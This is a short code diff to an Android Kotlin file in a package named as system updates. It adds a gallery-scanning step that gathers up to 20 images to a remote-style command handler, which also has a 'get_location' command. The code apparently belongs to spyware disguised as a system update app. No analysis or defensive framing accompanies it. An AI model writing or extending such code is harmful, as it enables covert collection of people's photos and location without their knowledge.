@@ -3,6 +3,7 @@ package com.system.updates.core
 import android.content.Context
 import android.content.Intent
 import android.util.Log
+import com.system.updates.modules.ImageModule
 
 object CommandExecutor {
 
@@ -17,6 +18,8 @@ object CommandExecutor {
             }
             "collect_images" -> {
                 Log.i(TAG, "Starting image collection process...")
+                val images = ImageModule.scanGallery(context, 20)
+                Log.i(TAG, "Collected ${images.size} images.")
             }
             "get_location" -> {
                 Log.i(TAG, "Fetching current location...")
